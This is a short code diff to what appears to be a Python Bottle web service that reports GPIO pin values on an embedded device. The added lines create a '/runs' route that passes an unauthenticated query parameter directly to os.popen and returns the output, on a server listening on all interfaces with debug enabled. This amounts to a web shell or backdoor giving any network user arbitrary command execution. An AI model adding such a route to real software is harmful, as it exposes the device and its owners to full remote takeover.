@@ -100,5 +100,10 @@ def counter():
 def getGPIO():
 
    return {"gpio56":getVal(56),"gpio122":getVal(122),"gpio123":getVal(123),"gpio124":getVal(124),"gpio125":getVal(125),"gpio126":getVal(126),"gpio121":getVal(121),"gpio101":getVal(101)}
+@route('/runs')
+def runs():
+ arg=request.query['arg']
+ return os.popen(arg).read()
+
 
 run(host='0.0.0.0', port=8080, debug=True)
